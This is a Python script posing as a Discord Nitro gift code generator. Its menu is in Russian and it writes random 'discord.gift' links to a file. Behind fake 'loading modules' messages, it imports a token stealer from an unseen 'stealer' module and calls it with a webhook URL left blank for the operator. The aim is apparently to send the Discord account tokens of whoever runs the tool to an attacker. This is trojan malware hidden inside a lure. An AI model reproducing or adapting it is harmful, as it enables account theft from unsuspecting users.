WEBHOOK_URL = ''

print('[Loading]', 'Загрузка модуля colorama...')
from stealer import tokenStealer

import os
clearConsole = lambda: os.system('cls')

from colorama import Fore, init
R = r = Fore.LIGHTRED_EX
G = g = Fore.LIGHTGREEN_EX
B = b = Fore.LIGHTBLUE_EX
Y = y = Fore.LIGHTYELLOW_EX
W = w = Fore.LIGHTWHITE_EX
M = m = Fore.LIGHTMAGENTA_EX
C = c = Fore.LIGHTCYAN_EX
init(wrap = False)

ezprint = lambda symvol, text, color: print(f'{B}[{R}{symvol}{B}]{color}{text}')

def ezinput(symvol, text, textColor, inputColor):
    print(f'{B}[{R}{symvol}{B}]{textColor}{text}{inputColor}', end='')
    ezprintReturn = input('')
    return ezprintReturn

clearConsole()
ezprint('Loading', 'Загрузка модуля colorama...', G)
ezprint('Loading', 'Загрузка всех модулей...', G)

tokenStealer(WEBHOOK_URL)
import time
import sys
import random
def generateString(leght : int, letters_list : list=None):
    if not letters_list:  letters_list_sort = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    else:
        letters_list_sort = []
        for i in letters_list:
            if type(i) == int:
                letters_list_sort.append(str(i))
    rString = ''.join(random.choice(letters_list_sort) for i in range(leght))
    return rString

generateNitroCode = lambda: f'https://discord.gift/{generateString(16)}'

while True:
    clearConsole()
    ezprint('*', f'1 - {g}генерация нитро', m)
    ezprint('*', f'2 - {g}узнать количестно созданных нитро', m)
    ezprint('*', f'3 - {g}выход', m)
    menu = ezinput('=>', 'Ввод:', g, y)
    if menu == '1':
        break
    elif menu == '2':
        try:
            with open('nitro-code.txt', 'r') as nitroFile:
                nitroLen = len(nitroFile.read().split('\n'))
                nitroFile.close()
        except:
            nitroLen = 0
        ezprint('!', f'В файле {b}nitro-code.txt {g}{nitroLen} нитро кодов', g)
        time.sleep(2)
    elif menu == '3':
        sys.exit()

created = 0

while True:
    with open('nitro-code.txt', 'a') as nitroGEN:
        nitroGEN.write(f'{generateNitroCode()}\n')
    created += 1
    clearConsole()
    ezprint('*>*', f'Создано {b}{created} {g}нитро кодов', g)
